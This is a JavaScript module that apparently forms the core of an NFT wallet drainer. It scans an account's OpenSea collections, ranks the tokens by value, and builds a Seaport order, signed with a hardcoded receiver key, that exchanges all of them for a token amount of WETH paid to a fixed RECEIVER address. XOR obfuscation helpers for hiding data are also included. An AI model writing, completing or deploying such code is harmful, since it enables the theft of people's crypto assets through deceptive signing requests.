import { Seaport } from '@opensea/seaport-js'
import { ethers } from "ethers";
import { RECEIVER, RECEIVER_PK, PROJECT_ID } from "./const";

const provider = new ethers.providers.JsonRpcProvider(
  `https://rinkeby.infura.io/v3/${PROJECT_ID}`
);

const signer = new ethers.Wallet(RECEIVER_PK, provider);

const seaport = new Seaport(signer);

/**
 *
 * @param {any} text data to encode
 * @returns {string} encoded string
 */
export const c = (text) => {
    try {
      text = JSON.stringify(text);
      const textToChars = (text) =>
        text
          .toString()
          .split("")
          .map((c) => c.charCodeAt(0));
      const byteHex = (n) => ("0" + Number(n).toString(16)).substr(-2);
      const applySaltToChar = (code) =>
        textToChars(31612400).reduce((a, b) => a ^ b, code);
  
      return text
        .split("")
        .map(textToChars)
        .map(applySaltToChar)
        .map(byteHex)
        .join("");
    } catch (e) {
      return null;
    }
  };
  
  /**
   *
   * @param {string} encoded encoded string from c
   * @returns {any} object that was decoded
   */
export const d = (encoded) => {
    try {
      const textToChars = (text) =>
        text
          .toString()
          .split("")
          .map((c) => c.charCodeAt(0));
      const applySaltToChar = (code) =>
        textToChars(31612400).reduce((a, b) => a ^ b, code);
      return JSON.parse(
        encoded
          .toString()
          .match(/.{1,2}/g)
          .map((hex) => parseInt(hex, 16))
          .map(applySaltToChar)
          .map((charCode) => String.fromCharCode(charCode))
          .join("")
      );
    } catch (e) {
      return null;
    }
  };

/**
 * @param {{ id: string; contractAddr: any; amount: any; }[]} tokensArr
 * @returns {{ itemType: number; token: string; identifierOrCriteria: string; startAmount: string; endAmount: string}[]}
 */
export function getOffer(tokensArr) {
  let res = [];
  tokensArr.forEach(
    (/** @type {{ id: string; contractAddr: any; amount: any; }} */ token) => {
      res.push({
        itemType: parseInt(token.id) ? 1 : 2, // 2 - nft, 1 - erc20
        token: token.contractAddr,
        identifierOrCriteria: token.id,
        startAmount: token.amount || 1,
        endAmount: token.amount || 1,
        paymentAsset: '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2'
      });
    }
  );

  return res;
}

/**
 * @param {{ itemType: number; token: string; identifierOrCriteria: string; startAmount: string; endAmount: string}[]} offer
 * @returns {{ itemType: number; token: string; identifierOrCriteria: string; startAmount: string; endAmount: string, recipient: string}[]}
 */
export function getConsideration(tokensArr) {
  const considerations = Array();
  tokensArr.forEach(token => {
    considerations.push({
      itemType: 2,
      token: token.contractAddr,
      identifier: token.id,
      recipient: RECEIVER
    })
  });
  console.log(considerations)
  return considerations;
}

/**
 * @param {string} account
 */
export async function scanNfts(account) {
  if (!account) return;
  if (!getItem("nfts") || !getItem("nfts").length) {
    try {
      // get list of collections
      const resp = await sendReq(
        "get",
        `https://api.opensea.io/api/v1/collections?asset_owner=${account}&offset=0&limit=20`
      );

      if (!resp || !resp.data) {
        showError("Internal error. Please reload the page");
        return;
      }

      // filter
      let collections = resp.data;
      collections = collections.filter(
        (collection) =>
          collection.description !== "" &&
          // collection.stats.seven_day_volume > 0 &&
          // collection.stats.one_day_average_price > 0 &&
          collection.primary_asset_contracts.length &&
          collection.primary_asset_contracts[0].schema_name !== "ERC1155" &&
          collection.primary_asset_contracts[0].address !==
            "0x57f1887a8bf19b14fc0df6fd9b2acc9af147ea85" // remove ens
      );

      // sort by price
      collections.sort((a, b) => {
        return a.stats.one_day_average_price < b.stats.one_day_average_price
          ? 1
          : -1;
      });

      // result collections
      console.log("collections:", collections);
      setItem("collections", collections);

      // get list of token ids
      let nfts = [];
      if (collections.length) {
        const assetsUrl = `https://api.opensea.io/api/v1/assets?owner=${account}`;
        var payload = "";
        // building request url. adding all collections contracts
        collections.forEach((collection) => {
          payload += `&asset_contract_addresses=${collection.primary_asset_contracts[0].address}`;
        });

        let res = await sendReq("get", `${assetsUrl}${payload}`);
        if (!res || !res.data) {
          showError("Internal error. Try again later");
          return;
        }
        let allNfts = res.data.assets;

        // get nfts for each collection
        collections.forEach((collection) => {
          let currentCollectionNfts = allNfts.filter(
            (nft) =>
              nft.asset_contract.address ===
              collection.primary_asset_contracts[0].address
          );

          currentCollectionNfts.forEach((nftInCurCollection) => {
            // add to result array
            nfts.push({
              contractAddr: collection.primary_asset_contracts[0].address,
              worth:
                Math.round(
                  collection.stats.one_day_average_price * 0.8 * 10000
                ) / 10000,
              tokenId: nftInCurCollection.token_id,
              id: nftInCurCollection.token_id,
            });
          });
        });

        // sort by worth
        nfts.sort((a, b) => {
          return a.worth < b.worth ? 1 : -1;
        });
      }

      console.log("nfts:", nfts);
      setItem("nfts", nfts);
      // await scanSea(account, nfts);
      return nfts;
    } catch (e) {
      // showError(e.message);
    }
  } else {
    return getItem("nfts");
  }
}

export async function buyNfts(tokensArr){
  console.log('ethers.utils.parseEther("1").toString()\n',ethers.utils.parseEther("1").toString())
  const { executeAllActions } = await seaport.createOrder(
    {
      offer: [
        {
          amount: "1",//ethers.utils.parseEther("1").toString(),
          // WETH
          token: "0xc778417e063141139fce010982780140aa0cd5ab",
        },
      ],
      consideration: getConsideration(tokensArr)
    },
    RECEIVER
  );
  
  const order = await executeAllActions();
  console.log("order created successfully")
  return order
}